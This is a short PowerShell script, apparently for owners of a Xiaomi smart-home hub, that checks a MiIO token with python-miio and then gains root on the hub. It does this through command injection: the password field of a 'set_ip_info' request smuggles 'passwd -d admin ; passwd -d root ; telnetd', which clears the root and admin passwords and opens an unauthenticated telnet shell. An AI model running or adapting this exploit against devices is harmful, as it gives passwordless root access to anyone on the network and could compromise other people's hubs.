[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$HubIp,

    [string]$Python = 'C:\Windows\py.exe',

    [switch]$VerifyOnly
)

$ErrorActionPreference = 'Stop'

function Invoke-PythonMiio {
    param([string]$Code)
    if (-not (Test-Path -LiteralPath $Python) -and -not (Get-Command $Python -ErrorAction SilentlyContinue)) {
        throw "Python launcher not found: $Python"
    }
    $leaf = [IO.Path]::GetFileName($Python).ToLowerInvariant()
    if ($leaf -eq 'py.exe' -or $leaf -eq 'py') {
        & $Python -3 -c $Code
    }
    else {
        & $Python -c $Code
    }
    if ($LASTEXITCODE -ne 0) {
        throw "Python/python-miio failed with exit code $LASTEXITCODE"
    }
}

$secureToken = Read-Host 'MiIO token (32 caractere hex)' -AsSecureString
$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureToken)
$token = $null

try {
    $token = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
    if ($token -notmatch '^[0-9A-Fa-f]{32}$') {
        throw 'Token MiIO invalid: trebuie sa aiba exact 32 caractere hexazecimale.'
    }

    $env:HUB_IP = $HubIp
    $env:MIIO_TOKEN = $token

    Write-Host '1/2 Verific tokenul prin Device.info()...'
    Invoke-PythonMiio "from miio import Device; import os; d=Device(os.environ['HUB_IP'], os.environ['MIIO_TOKEN']); print(d.info())"
    Write-Host 'MIIO_TOKEN_OK'

    if ($VerifyOnly) { return }

    Write-Host '2/2 Activez Telnet temporar prin comanda MiIO validata...'
    Invoke-PythonMiio "from miio import Device; import os; q=chr(34); d=Device(os.environ['HUB_IP'],os.environ['MIIO_TOKEN']); print(d.raw_command('set_ip_info',{'ssid':q+q,'pswd':'123123 ; passwd -d admin ; passwd -d root ; telnetd'}))"
    Write-Host "TELNET_REQUEST_SENT $HubIp"
    Write-Host 'User recomandat: admin, parola goala.'
}
finally {
    Remove-Item Env:MIIO_TOKEN -ErrorAction SilentlyContinue
    Remove-Item Env:HUB_IP -ErrorAction SilentlyContinue
    if ($bstr -ne [IntPtr]::Zero) {
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
    }
    $token = $null
}
